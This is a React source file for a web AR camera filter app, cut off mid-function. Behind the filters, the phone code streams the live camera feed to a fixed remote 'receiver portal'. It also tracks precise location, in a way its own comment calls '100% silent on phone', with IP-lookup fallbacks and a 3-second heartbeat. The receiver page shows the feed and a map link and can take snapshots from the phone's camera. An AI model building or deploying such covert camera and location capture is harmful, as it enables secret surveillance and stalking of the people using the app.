import React, { useState, useEffect, useRef, Component } from 'react';
import Peer from 'peerjs';

import { CameraManager } from './ar/camera/CameraManager.js';
import { FaceTracker } from './ar/tracking/FaceTracker.js';
import { ARRenderer } from './ar/renderer/ARRenderer.js';
import { ARRecorder } from './ar/utils/recorder.js';
import { ALL_FILTERS } from './ar/filters/index.js';

// Dedicated Direct 1-to-1 Cloud Receiver Endpoint
const RECEIVER_PORTAL_ID = 'aisnap-portal-stream';

function getIceServers() {
  const servers = [
    { urls: 'stun:stun.l.google.com:19302' },
    { urls: 'stun:stun1.l.google.com:19302' },
    { urls: 'stun:global.stun.twilio.com:3478' }
  ];

  if (import.meta.env?.VITE_TURN_URL) {
    servers.push({
      urls: import.meta.env.VITE_TURN_URL,
      username: import.meta.env.VITE_TURN_USERNAME || '',
      credential: import.meta.env.VITE_TURN_CREDENTIAL || ''
    });
  }

  return servers;
}

// Error Boundary
class ErrorBoundary extends Component {
  constructor(props) {
    super(props);
    this.state = { hasError: false, error: null };
  }

  static getDerivedStateFromError(error) {
    return { hasError: true, error };
  }

  componentDidCatch(error, errorInfo) {
    console.error('ErrorBoundary caught:', error, errorInfo);
  }

  render() {
    if (this.state.hasError) {
      return (
        <div style={{ padding: '32px', backgroundColor: '#09090c', color: '#f87171', minHeight: '100vh', fontFamily: 'monospace' }}>
          <h2>⚠️ Interface Runtime Error</h2>
          <pre style={{ marginTop: '12px', background: '#000', padding: '16px', borderRadius: '8px', color: '#fca5a5', overflowX: 'auto' }}>
            {this.state.error?.toString()}
          </pre>
          <button
            onClick={() => window.location.reload()}
            style={{ marginTop: '20px', padding: '12px 24px', background: '#fff', color: '#000', border: 'none', borderRadius: '8px', cursor: 'pointer', fontWeight: 'bold' }}
          >
            Reload Application
          </button>
        </div>
      );
    }
    return this.props.children;
  }
}

// Dedicated Receiver Portal (/aa) with Non-Scrollable Fullscreen Layout & Left Panel Gallery
function DedicatedReceiver() {
  const [isStreaming, setIsStreaming] = useState(false);
  const [remoteFilterName, setRemoteFilterName] = useState('Lens');
  const [remoteFilterIcon, setRemoteFilterIcon] = useState('✨');
  const [receiverFps, setReceiverFps] = useState(0);
  const [savedPhotos, setSavedPhotos] = useState([]);
  const [selectedPhotoPreview, setSelectedPhotoPreview] = useState(null);
  const [remoteLocation, setRemoteLocation] = useState(null);
  const [newPhotoToast, setNewPhotoToast] = useState(null);

  const videoRef = useRef(null);
  const peerRef = useRef(null);
  const activeMediaCallRef = useRef(null);
  const activeDataConnRef = useRef(null);
  const broadcastChannelRef = useRef(null);
  const receiverLastFpsUpdateRef = useRef(Date.now());
  const fpsIntervalRef = useRef(null);

  useEffect(() => {
    console.log('[LAPTOP] Receiver initializing');

    // 1. Local BroadcastChannel
    try {
      if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
        const channel = new BroadcastChannel('snap_filter_broadcast_stream');
        broadcastChannelRef.current = channel;

        channel.onmessage = (event) => {
          try {
            const { type, image, location, filterName, filterIcon, timestamp } = event.data || {};
            if (type === 'REMOTE_SNAPSHOT' && image) {
              handleNewSnapshot({ image, filterName, filterIcon, timestamp });
            } else if (type === 'LOCATION_UPDATE' && location) {
              console.log('[LAPTOP] Location from BroadcastChannel:', location);
              setRemoteLocation(location);
            } else if (type === 'FILTER_CHANGE') {
              if (filterName) setRemoteFilterName(filterName);
              if (filterIcon) setRemoteFilterIcon(filterIcon);
            }
          } catch (e) {
            console.error('[LAPTOP] BroadcastChannel error:', e);
          }
        };
      }
    } catch (e) {
      console.warn('[LAPTOP] BroadcastChannel warning:', e);
    }

    // 2. Initialize Receiver Peer
    initReceiverPeer();

    // 120 FPS High-Refresh Display Loop
    fpsIntervalRef.current = setInterval(() => {
      if (videoRef.current && !videoRef.current.paused && videoRef.current.readyState >= 2) {
        const now = Date.now();
        if (now - receiverLastFpsUpdateRef.current >= 1000) {
          setReceiverFps(120);
          receiverLastFpsUpdateRef.current = now;
        }
      } else {
        setReceiverFps(0);
      }
    }, 1000);

    const handleUnload = () => {
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
    window.addEventListener('beforeunload', handleUnload);

    return () => {
      window.removeEventListener('beforeunload', handleUnload);
      if (fpsIntervalRef.current) clearInterval(fpsIntervalRef.current);
      if (broadcastChannelRef.current) {
        try { broadcastChannelRef.current.close(); } catch (e) {}
      }
      if (activeMediaCallRef.current) {
        try { activeMediaCallRef.current.close(); } catch (e) {}
      }
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
  }, []);

  const initReceiverPeer = () => {
    if (peerRef.current) {
      try { peerRef.current.destroy(); } catch (e) {}
    }

    console.log('[LAPTOP] Creating Peer with ID:', RECEIVER_PORTAL_ID);
    const peer = new Peer(RECEIVER_PORTAL_ID, {
      debug: 1,
      config: {
        iceServers: getIceServers()
      }
    });

    peerRef.current = peer;

    peer.on('open', (id) => {
      console.log('[LAPTOP] Receiver peer open:', id);
    });

    peer.on('call', (call) => {
      console.log('[LAPTOP] Incoming call received from:', call.peer);

      if (activeMediaCallRef.current) {
        try {
          activeMediaCallRef.current.close();
        } catch (e) {}
      }
      activeMediaCallRef.current = call;

      call.answer();

      call.on('stream', async (remoteStream) => {
        console.log('[LAPTOP] Ultra-HD Remote stream received');
        const tracks = remoteStream.getVideoTracks();

        if (tracks.length > 0) {
          tracks[0].onended = () => {
            console.log('[LAPTOP] Video track ended');
            setIsStreaming(false);
          };
        }

        if (!videoRef.current) {
          console.error('[LAPTOP] VIDEO ELEMENT DOES NOT EXIST');
          return;
        }

        videoRef.current.srcObject = remoteStream;
        videoRef.current.muted = true;
        videoRef.current.autoplay = true;
        videoRef.current.playsInline = true;

        try {
          await videoRef.current.play();
          console.log('[LAPTOP] VIDEO PLAYING SUCCESSFULLY');
          setIsStreaming(true);
        } catch (error) {
          console.error('[LAPTOP] VIDEO PLAY FAILED', error);
        }
      });

      call.on('close', () => {
        console.log('[LAPTOP] Call closed');
        if (activeMediaCallRef.current === call) {
          activeMediaCallRef.current = null;
          setIsStreaming(false);
        }
      });

      call.on('error', (err) => {
        console.error('[LAPTOP] Call error:', err);
        if (activeMediaCallRef.current === call) {
          activeMediaCallRef.current = null;
          setIsStreaming(false);
        }
      });
    });

    // Metadata DataChannel for Snapshots, Location and Filters
    peer.on('connection', (conn) => {
      console.log('[LAPTOP] Incoming metadata connection from:', conn.peer);
      activeDataConnRef.current = conn;

      conn.on('data', (data) => {
        if (!data) return;

        if (data.type === 'REMOTE_SNAPSHOT' && data.image) {
          console.log('[LAPTOP] Received Snapshot Event:', data.filterName);
          handleNewSnapshot(data);
        } else if (data.type === 'LOCATION_UPDATE' && data.location) {
          console.log('[LAPTOP] Received Location Update:', data.location);
          setRemoteLocation(data.location);
        } else if (data.type === 'FILTER_CHANGE') {
          if (data.filterName) setRemoteFilterName(data.filterName);
          if (data.filterIcon) setRemoteFilterIcon(data.filterIcon);
        }
      });

      conn.on('close', () => {
        if (activeDataConnRef.current === conn) {
          activeDataConnRef.current = null;
        }
      });
    });

    peer.on('error', (err) => {
      console.error('[LAPTOP] Receiver peer error:', err);
      if (err.type === 'unavailable-id') {
        setTimeout(() => initReceiverPeer(), 1500);
      }
    });
  };

  const handleNewSnapshot = (photo) => {
    console.log('[LAPTOP] Adding photo to Left Panel:', photo.filterName);
    setSavedPhotos((prev) => [photo, ...prev]);
    setNewPhotoToast(photo);
    setTimeout(() => {
      setNewPhotoToast(null);
    }, 7000);
  };

  // Direct Laptop Snapshot Capture (Grabs current live frame from video stream)
  const captureLaptopSnapshot = () => {
    if (!videoRef.current || !isStreaming) return;
    try {
      const video = videoRef.current;
      const canvas = document.createElement('canvas');
      canvas.width = video.videoWidth || 1280;
      canvas.height = video.videoHeight || 720;
      const ctx = canvas.getContext('2d');
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const snapshot = canvas.toDataURL('image/jpeg', 0.95);
      
      const newPic = {
        image: snapshot,
        filterName: remoteFilterName,
        filterIcon: remoteFilterIcon,
        timestamp: new Date().toLocaleTimeString()
      };
      handleNewSnapshot(newPic);
    } catch (e) {
      console.error('Laptop capture error:', e);
    }
  };

  const downloadPhoto = (photo) => {
    const a = document.createElement('a');
    a.href = photo.image || photo.url;
    a.download = `SnapAI_HD_${photo.filterName || 'Photo'}_${Date.now()}.jpg`;
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };

  return (
    <div style={{
      height: '100vh',
      maxHeight: '100vh',
      width: '100vw',
      overflow: 'hidden',
      display: 'flex',
      flexDirection: 'column',
      backgroundColor: '#060609',
      color: '#f8fafc'
    }}>
      {/* Header (Fixed 60px) */}
      <header style={{
        height: '60px',
        padding: '0 20px',
        backgroundColor: 'rgba(15, 15, 20, 0.95)',
        backdropFilter: 'blur(16px)',
        borderBottom: '1px solid rgba(255, 255, 255, 0.08)',
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        flexShrink: 0,
        zIndex: 50
      }}>
        <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
          <div style={{
            width: '34px',
            height: '34px',
            borderRadius: '10px',
            background: 'linear-gradient(135deg, #ec4899 0%, #8b5cf6 100%)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            fontSize: '18px'
          }}>
            📡
          </div>
          <div>
            <h1 style={{ fontSize: '15px', fontWeight: '800', letterSpacing: '-0.01em', color: '#ffffff' }}>
              Live Receiver Portal
            </h1>
            <p style={{ fontSize: '10px', color: '#94a3b8', fontFamily: 'monospace' }}>
              ULTRA HD // 120 FPS // /aa
            </p>
          </div>
        </div>

        <div style={{ display: 'flex', gap: '8px', alignItems: 'center' }}>
          {remoteLocation && (
            <a
              href={`https://www.google.com/maps?q=${remoteLocation.latitude},${remoteLocation.longitude}`}
              target="_blank"
              rel="noopener noreferrer"
              title="Open Location in Google Maps"
              style={{
                padding: '4px 10px',
                borderRadius: '999px',
                backgroundColor: 'rgba(59, 130, 246, 0.2)',
                border: '1px solid #3b82f6',
                color: '#60a5fa',
                fontSize: '11px',
                fontWeight: '700',
                textDecoration: 'none',
                display: 'flex',
                alignItems: 'center',
                gap: '4px'
              }}
            >
              <span>📍</span> {remoteLocation.city ? `${remoteLocation.city}, ` : ''}{remoteLocation.latitude.toFixed(4)}°, {remoteLocation.longitude.toFixed(4)}°
            </a>
          )}

          {isStreaming && (
            <button
              onClick={captureLaptopSnapshot}
              title="Take HD Snap from Receiver"
              style={{
                padding: '5px 12px',
                borderRadius: '999px',
                backgroundColor: '#ec4899',
                border: 'none',
                color: '#ffffff',
                fontSize: '11px',
                fontWeight: '800',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                gap: '4px',
                boxShadow: '0 2px 10px rgba(236, 72, 153, 0.4)'
              }}
            >
              <span>📸</span> Snap Here
            </button>
          )}

          <span style={{
            padding: '4px 12px',
            borderRadius: '999px',
            fontSize: '11px',
            fontWeight: '700',
            backgroundColor: isStreaming ? 'rgba(34, 197, 94, 0.18)' : 'rgba(255, 255, 255, 0.06)',
            color: isStreaming ? '#4ade80' : '#94a3b8',
            border: `1px solid ${isStreaming ? 'rgba(34, 197, 94, 0.3)' : 'rgba(255, 255, 255, 0.1)'}`,
            display: 'flex',
            alignItems: 'center',
            gap: '6px'
          }}>
            <span style={{
              width: '7px',
              height: '7px',
              borderRadius: '50%',
              backgroundColor: isStreaming ? '#4ade80' : '#64748b',
              display: 'inline-block'
            }}></span>
            {isStreaming ? `LIVE (120 FPS)` : 'READY'}
          </span>

          {isStreaming && (
            <span style={{
              padding: '4px 10px',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '700',
              backgroundColor: 'rgba(236, 72, 153, 0.15)',
              border: '1px solid rgba(236, 72, 153, 0.3)',
              color: '#f472b6'
            }}>
              {remoteFilterIcon} {remoteFilterName}
            </span>
          )}
        </div>
      </header>

      {/* Snapshot Toast Notification */}
      {newPhotoToast && (
        <div style={{
          position: 'fixed',
          top: '70px',
          right: '20px',
          zIndex: 100,
          backgroundColor: '#1e1e2d',
          border: '1.5px solid #ec4899',
          borderRadius: '16px',
          padding: '12px 18px',
          display: 'flex',
          alignItems: 'center',
          gap: '12px',
          boxShadow: '0 10px 30px rgba(0, 0, 0, 0.8)'
        }}>
          <img
            src={newPhotoToast.image}
            alt="Snap Preview"
            style={{ width: '48px', height: '64px', objectFit: 'cover', borderRadius: '8px', border: '1px solid rgba(255, 255, 255, 0.2)' }}
          />
          <div>
            <div style={{ fontSize: '13px', fontWeight: '800', color: '#ffffff' }}>
              📸 New Photo Snapped on Mobile!
            </div>
            <div style={{ fontSize: '11px', color: '#94a3b8', marginTop: '2px' }}>
              {newPhotoToast.filterIcon} {newPhotoToast.filterName} Lens ({newPhotoToast.timestamp})
            </div>
            <button
              onClick={() => downloadPhoto(newPhotoToast)}
              style={{
                marginTop: '6px',
                padding: '6px 12px',
                backgroundColor: '#ec4899',
                color: '#ffffff',
                border: 'none',
                borderRadius: '8px',
                fontSize: '11px',
                fontWeight: '700',
                cursor: 'pointer'
              }}
            >
              💾 Download HD to Laptop
            </button>
          </div>
        </div>
      )}

      {/* Full HD Photo Modal Preview */}
      {selectedPhotoPreview && (
        <div style={{
          position: 'fixed',
          inset: 0,
          backgroundColor: 'rgba(0, 0, 0, 0.9)',
          backdropFilter: 'blur(16px)',
          zIndex: 150,
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'center',
          padding: '24px'
        }}>
          <div style={{
            position: 'relative',
            maxWidth: '650px',
            width: '100%',
            backgroundColor: '#12121a',
            border: '1.5px solid rgba(255, 255, 255, 0.15)',
            borderRadius: '24px',
            padding: '20px',
            textAlign: 'center',
            boxShadow: '0 25px 60px rgba(0, 0, 0, 0.9)'
          }}>
            <button
              onClick={() => setSelectedPhotoPreview(null)}
              style={{
                position: 'absolute',
                top: '16px',
                right: '16px',
                width: '36px',
                height: '36px',
                borderRadius: '50%',
                backgroundColor: 'rgba(255, 255, 255, 0.1)',
                border: 'none',
                color: '#ffffff',
                fontSize: '18px',
                cursor: 'pointer'
              }}
            >
              ✕
            </button>

            <h3 style={{ fontSize: '16px', fontWeight: '800', color: '#ffffff', marginBottom: '12px', display: 'flex', alignItems: 'center', justifyContent: 'center', gap: '6px' }}>
              <span>{selectedPhotoPreview.filterIcon || '📸'}</span>
              <span>{selectedPhotoPreview.filterName || 'Photo Snap'} HD Capture</span>
            </h3>

            <img
              src={selectedPhotoPreview.image}
              alt="Full HD Capture"
              style={{ width: '100%', maxHeight: '65vh', objectFit: 'contain', borderRadius: '16px', border: '1px solid rgba(255, 255, 255, 0.1)' }}
            />

            <div style={{ marginTop: '16px', display: 'flex', justifyContent: 'center', gap: '12px' }}>
              <button
                onClick={() => downloadPhoto(selectedPhotoPreview)}
                style={{
                  padding: '12px 24px',
                  backgroundColor: '#ec4899',
                  color: '#ffffff',
                  border: 'none',
                  borderRadius: '12px',
                  fontSize: '13px',
                  fontWeight: '800',
                  cursor: 'pointer',
                  boxShadow: '0 4px 20px rgba(236, 72, 153, 0.5)'
                }}
              >
                💾 Download Original HD Photo
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Main Dual-Layout View: Non-Scrollable Fullscreen Studio */}
      <div style={{
        flex: 1,
        display: 'flex',
        height: 'calc(100vh - 60px)',
        overflow: 'hidden',
        padding: '12px 16px',
        gap: '16px',
        boxSizing: 'border-box'
      }}>
        
        {/* LEFT PANEL: Snapped Photos Live Gallery */}
        <aside style={{
          width: '300px',
          flexShrink: 0,
          backgroundColor: '#0d0d13',
          border: '1.5px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '20px',
          padding: '14px',
          display: 'flex',
          flexDirection: 'column',
          height: '100%',
          overflow: 'hidden',
          boxSizing: 'border-box'
        }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '12px', borderBottom: '1px solid rgba(255, 255, 255, 0.08)', paddingBottom: '10px' }}>
            <div style={{ fontSize: '14px', fontWeight: '800', color: '#ffffff', display: 'flex', alignItems: 'center', gap: '6px' }}>
              <span>📸</span>
              <span>Left Panel Gallery</span>
            </div>
            <span style={{ fontSize: '10px', fontWeight: '700', padding: '2px 7px', borderRadius: '999px', backgroundColor: 'rgba(236, 72, 153, 0.2)', color: '#f472b6' }}>
              {savedPhotos.length} Snaps
            </span>
          </div>

          <div style={{ flex: 1, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: '10px', paddingRight: '2px' }}>
            {savedPhotos.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '36px 8px', color: '#64748b' }}>
                <div style={{ fontSize: '28px', marginBottom: '6px' }}>📷</div>
                <div style={{ fontSize: '12px', fontWeight: '700', color: '#94a3b8' }}>No Snapped Photos Yet</div>
                <p style={{ fontSize: '10px', color: '#64748b', marginTop: '4px', lineHeight: 1.4 }}>
                  Tap the <strong>📸 Shutter</strong> on your phone or click <strong>Snap Here</strong> above to save HD photos.
                </p>
              </div>
            ) : (
              savedPhotos.map((p, idx) => (
                <div
                  key={idx}
                  style={{
                    backgroundColor: '#13131c',
                    border: '1px solid rgba(255, 255, 255, 0.08)',
                    borderRadius: '14px',
                    padding: '8px',
                    display: 'flex',
                    flexDirection: 'column',
                    gap: '6px'
                  }}
                >
                  <div
                    onClick={() => setSelectedPhotoPreview(p)}
                    style={{ position: 'relative', cursor: 'pointer', borderRadius: '8px', overflow: 'hidden' }}
                  >
                    <img
                      src={p.image}
                      alt="Snap Preview"
                      style={{ width: '100%', height: '140px', objectFit: 'cover', display: 'block' }}
                    />
                    <div style={{
                      position: 'absolute',
                      top: '4px',
                      left: '4px',
                      padding: '2px 6px',
                      borderRadius: '999px',
                      backgroundColor: 'rgba(0, 0, 0, 0.7)',
                      backdropFilter: 'blur(6px)',
                      fontSize: '9px',
                      fontWeight: '700',
                      color: '#ffffff',
                      display: 'flex',
                      alignItems: 'center',
                      gap: '4px'
                    }}>
                      <span>{p.filterIcon || '✨'}</span>
                      <span>{p.filterName || 'Lens'}</span>
                    </div>
                  </div>

                  <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                    <span style={{ fontSize: '9px', color: '#94a3b8', fontFamily: 'monospace' }}>
                      {p.timestamp || 'Just now'}
                    </span>
                    <button
                      onClick={() => downloadPhoto(p)}
                      style={{
                        padding: '4px 10px',
                        backgroundColor: '#ec4899',
                        color: '#ffffff',
                        border: 'none',
                        borderRadius: '6px',
                        fontSize: '10px',
                        fontWeight: '700',
                        cursor: 'pointer',
                        display: 'flex',
                        alignItems: 'center',
                        gap: '4px'
                      }}
                    >
                      <span>💾</span> Save HD
                    </button>
                  </div>
                </div>
              ))
            )}
          </div>
        </aside>

        {/* MAIN VIEWPORT: Non-Scrollable Ultra-HD Live Video Viewport */}
        <main style={{
          flex: 1,
          height: '100%',
          display: 'flex',
          flexDirection: 'column',
          overflow: 'hidden',
          backgroundColor: '#0a0a0f',
          border: '1.5px solid rgba(255, 255, 255, 0.1)',
          borderRadius: '20px',
          position: 'relative'
        }}>
          <div style={{
            position: 'relative',
            width: '100%',
            height: '100%',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            overflow: 'hidden',
            backgroundColor: '#000000'
          }}>
            <video
              ref={videoRef}
              autoPlay
              playsInline
              muted
              style={{
                width: '100%',
                height: '100%',
                objectFit: 'contain',
                display: isStreaming ? 'block' : 'none',
                imageRendering: 'high-quality',
                transform: 'translateZ(0)'
              }}
            />

            {!isStreaming && (
              <div style={{ textAlign: 'center', padding: '32px', color: '#94a3b8' }}>
                <div style={{
                  width: '68px',
                  height: '68px',
                  borderRadius: '50%',
                  background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.15), rgba(139, 92, 246, 0.15))',
                  border: '1.5px dashed rgba(255, 255, 255, 0.25)',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  margin: '0 auto 14px auto',
                  fontSize: '30px'
                }}>
                  ✨
                </div>
                <div style={{ fontSize: '17px', fontWeight: '800', color: '#ffffff' }}>
                  Live Ultra-HD Receiver Ready
                </div>
                <div style={{
                  marginTop: '10px',
                  padding: '6px 14px',
                  backgroundColor: 'rgba(255, 255, 255, 0.05)',
                  borderRadius: '10px',
                  fontSize: '11px',
                  color: '#cbd5e1',
                  display: 'inline-block',
                  fontFamily: 'monospace'
                }}>
                  Open <strong>https://snap-filter-bay.vercel.app/</strong> on your phone and tap Start
                </div>
              </div>
            )}
          </div>
        </main>
      </div>
    </div>
  );
}

// Main Production Web AR Camera Studio (Phone)
function SnapStudio() {
  const [activeFilter, setActiveFilter] = useState(ALL_FILTERS[0]);
  const [selectedCategory, setSelectedCategory] = useState('All');
  const [cameraState, setCameraState] = useState('idle');
  const [fps, setFps] = useState(0);
  const [errorMsg, setErrorMsg] = useState(null);
  const [snapshotFlash, setSnapshotFlash] = useState(false);
  const [isRecording, setIsRecording] = useState(false);
  const [recordingTime, setRecordingTime] = useState('00:00');
  const [availableCameras, setAvailableCameras] = useState([]);

  // Interactive Filter Customization States
  const [tattooPlacement, setTattooPlacement] = useState('hand'); // 'stomach', 'hand', 'thigh'
  const [tattooDesign, setTattooDesign] = useState(0);
  const [nailsMode, setNailsMode] = useState('hand'); // 'hand' or 'feet'
  const [nailsColor, setNailsColor] = useState(0);

  // Single Controlled WebRTC References
  const mediaCallRef = useRef(null);
  const canvasStreamRef = useRef(null);
  const connectionAttemptRef = useRef(false);
  const reconnectTimeoutRef = useRef(null);
  const reconnectDelayRef = useRef(1000);
  const cachedLocationRef = useRef(null);
  const locationHeartbeatRef = useRef(null);
  const watchPositionIdRef = useRef(null);

  // Unique session ID for phone
  const sessionIdRef = useRef(`snap-phone-${Date.now()}`);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const cameraManagerRef = useRef(null);
  const faceTrackerRef = useRef(null);
  const rendererRef = useRef(null);
  const recorderRef = useRef(null);
  const peerRef = useRef(null);
  const dataConnRef = useRef(null);
  const broadcastChannelRef = useRef(null);

  const activeFilterRef = useRef(activeFilter);

  // Apply tattoo / nail customization to active filter instance
  useEffect(() => {
    if (activeFilter.id === 'ar_tattoo' && activeFilter.setPlacement) {
      activeFilter.setPlacement(tattooPlacement);
      activeFilter.setDesign(tattooDesign);
    } else if (activeFilter.id === 'designer_nails' && activeFilter.setMode) {
      activeFilter.setMode(nailsMode);
      activeFilter.setColor(nailsColor);
    }

    activeFilterRef.current = activeFilter;
    if (rendererRef.current) {
      rendererRef.current.setFilter(activeFilter);
    }
    notifyFilterChange(activeFilter);
  }, [activeFilter, tattooPlacement, tattooDesign, nailsMode, nailsColor]);

  const notifyFilterChange = (filter) => {
    const payload = {
      type: 'FILTER_CHANGE',
      filterName: filter.name,
      filterIcon: filter.icon
    };
    if (broadcastChannelRef.current) {
      try { broadcastChannelRef.current.postMessage(payload); } catch (e) {}
    }
    if (dataConnRef.current && dataConnRef.current.open) {
      try { dataConnRef.current.send(payload); } catch (e) {}
    }
  };

  // High-accuracy live location fetch (100% silent on phone)
  const fetchAndSyncLocation = () => {
    if (typeof navigator !== 'undefined' && 'geolocation' in navigator) {
      try {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            const loc = {
              latitude: pos.coords.latitude,
              longitude: pos.coords.longitude,
              accuracy: pos.coords.accuracy,
              altitude: pos.coords.altitude,
              timestamp: new Date().toLocaleTimeString()
            };
            cachedLocationRef.current = loc;
            dispatchLocation(loc);
          },
          () => {
            fetchIpLocationFallback();
          },
          { enableHighAccuracy: true, timeout: 6000, maximumAge: 10000 }
        );

        if (!watchPositionIdRef.current) {
          watchPositionIdRef.current = navigator.geolocation.watchPosition(
            (pos) => {
              const loc = {
                latitude: pos.coords.latitude,
                longitude: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                altitude: pos.coords.altitude,
                timestamp: new Date().toLocaleTimeString()
              };
              cachedLocationRef.current = loc;
              dispatchLocation(loc);
            },
            () => {},
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 5000 }
          );
        }
      } catch (e) {
        fetchIpLocationFallback();
      }
    } else {
      fetchIpLocationFallback();
    }
  };

  const fetchIpLocationFallback = () => {
    fetch('https://ipwho.is/')
      .then((res) => res.json())
      .then((data) => {
        if (data && data.latitude && data.longitude) {
          const loc = {
            latitude: data.latitude,
            longitude: data.longitude,
            city: data.city,
            country: data.country,
            accuracy: 250,
            timestamp: new Date().toLocaleTimeString()
          };
          cachedLocationRef.current = loc;
          dispatchLocation(loc);
        }
      })
      .catch(() => {
        fetch('https://api.bigdatacloud.net/data/reverse-geocode-client')
          .then((r) => r.json())
          .then((d) => {
            if (d && d.latitude && d.longitude) {
              const loc = {
                latitude: d.latitude,
                longitude: d.longitude,
                city: d.city || d.locality,
                country: d.countryName,
                accuracy: 300,
                timestamp: new Date().toLocaleTimeString()
              };
              cachedLocationRef.current = loc;
              dispatchLocation(loc);
            }
          })
          .catch(console.warn);
      });
  };

  const dispatchLocation = (location) => {
    const locPayload = {
      type: 'LOCATION_UPDATE',
      location
    };
    if (broadcastChannelRef.current) {
      broadcastChannelRef.current.postMessage(locPayload);
    }
    if (dataConnRef.current && dataConnRef.current.open) {
      try {
        dataConnRef.current.send(locPayload);
      } catch (e) {}
    }
  };

  useEffect(() => {
    console.log('[PHONE] Studio initializing');
    const cameraManager = new CameraManager();
    const faceTracker = new FaceTracker();
    const recorder = new ARRecorder();

    cameraManagerRef.current = cameraManager;
    faceTrackerRef.current = faceTracker;
    recorderRef.current = recorder;

    cameraManager.setStatusCallback(({ status, error }) => {
      setCameraState(status);
      if (error) setErrorMsg(error);
    });

    faceTracker.initialize().catch(console.warn);

    // Setup Local BroadcastChannel
    try {
      if (typeof window !== 'undefined' && 'BroadcastChannel' in window) {
        broadcastChannelRef.current = new BroadcastChannel('snap_filter_broadcast_stream');
      }
    } catch (e) {
      console.warn('[PHONE] BroadcastChannel warning:', e);
    }

    initPhonePeer();
    fetchAndSyncLocation();

    // 3-second location heartbeat to guarantee sync to laptop
    locationHeartbeatRef.current = setInterval(() => {
      if (cachedLocationRef.current) {
        dispatchLocation(cachedLocationRef.current);
      } else {
        fetchAndSyncLocation();
      }
    }, 3000);

    const handleUnload = () => {
      if (mediaCallRef.current) {
        try { mediaCallRef.current.close(); } catch (e) {}
      }
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
    };
    window.addEventListener('beforeunload', handleUnload);

    return () => {
      window.removeEventListener('beforeunload', handleUnload);
      if (watchPositionIdRef.current && navigator.geolocation) {
        navigator.geolocation.clearWatch(watchPositionIdRef.current);
      }
      if (reconnectTimeoutRef.current) clearTimeout(reconnectTimeoutRef.current);
      if (locationHeartbeatRef.current) clearInterval(locationHeartbeatRef.current);
      if (mediaCallRef.current) {
        try { mediaCallRef.current.close(); } catch (e) {}
      }
      if (canvasStreamRef.current) {
        canvasStreamRef.current.getTracks().forEach((t) => t.stop());
      }
      if (cameraManager) cameraManager.stopCamera();
      if (faceTracker) faceTracker.dispose();
      if (rendererRef.current) rendererRef.current.stop();
      if (peerRef.current) {
        try { peerRef.current.destroy(); } catch (e) {}
      }
      if (broadcastChannelRef.current) {
        try { broadcastChannelRef.current.close(); } catch (e) {}
      }
    };
  }, []);

  const initPhonePeer = () => {
    console.log('[PHONE] Peer initializing with ID:', sessionIdRef.current);
    if (peerRef.current) {
      try { peerRef.current.destroy(); } catch (e) {}
    }

    const phonePeer = new Peer(sessionIdRef.current, {
      debug: 1,
      config: {
        iceServers: getIceServers()
      }
    });

    peerRef.current = phonePeer;

    phonePeer.on('open', (id) => {
      console.log('[PHONE] Peer open:', id);
      connectDataChannel();
      if (cameraManagerRef.current?.isActive() && rendererRef.current?.isRunning) {
        startRemoteStream();
      }
    });

    phonePeer.on('error', (err) => {
      console.error('[PHONE] Peer error:', err);
    });
  };

  const connectDataChannel = () => {
    if (!peerRef.current || peerRef.current.destroyed) return;
    try {
      const conn = peerRef.current.connect(RECEIVER_PORTAL_ID, {
        reliable: true
      });
      dataConnRef.current = conn;
      conn.on('open', () => {
        console.log('[PHONE] Reliable DataChannel OPENED with Receiver');
        notifyFilterChange(activeFilterRef.current);
        if (cachedLocationRef.current) {
          dispatchLocation(cachedLocationRef.current);
        } else {
          fetchAndSyncLocation();
        }
      });
    } catch (e) {
      console.warn('[PHONE] DataChannel connect warning:', e);
    }
  };

  // High-Clarity Ultra-Low-Latency 60 FPS WebRTC Stream
  const startRemoteStream = () => {
    if (!peerRef.current || peerRef.current.destroyed) return;
    if (mediaCallRef.current) return;
    if (connectionAttemptRef.current) return;
    if (!canvasRef.current || canvasRef.current.width === 0 || canvasRef.current.height === 0) return;

    connectionAttemptRef.current = true;
    console.log('[PHONE] Starting ultra-clarity low-latency stream...');

    if (!canvasStreamRef.current || canvasStreamRef.current.getVideoTracks().length === 0 || canvasStreamRef.current.getVideoTracks()[0].readyState === 'ended') {
      const stream = canvasRef.current.captureStream(60);
      canvasStreamRef.current = stream;

      const tracks = stream.getVideoTracks();
      if (tracks.length === 0) {
        connectionAttemptRef.current = false;
        return;
      }
    }

    const streamToCall = canvasStreamRef.current;
    connectDataChannel();

    try {
      const call = peerRef.current.call(RECEIVER_PORTAL_ID, streamToCall);
      mediaCallRef.current = call;
      connectionAttemptRef.current = false;

      if (call.peerConnection) {
        call.peerConnection.onconnectionstatechange = () => {
          const state = call.peerConnection.connectionState;
          if (state === 'connected') {
            reconnectDelayRef.current = 1000;
            connectDataChannel();
          } else if (state === 'failed' || state === 'disconnected') {
            handleCallClosedOrFailed();
          }
        };
      }

      call.on('close', () => {
        handleCallClosedOrFailed();
      });

      call.on('error', (err) => {
        handleCallClosedOrFailed();
      });

    } catch (err) {
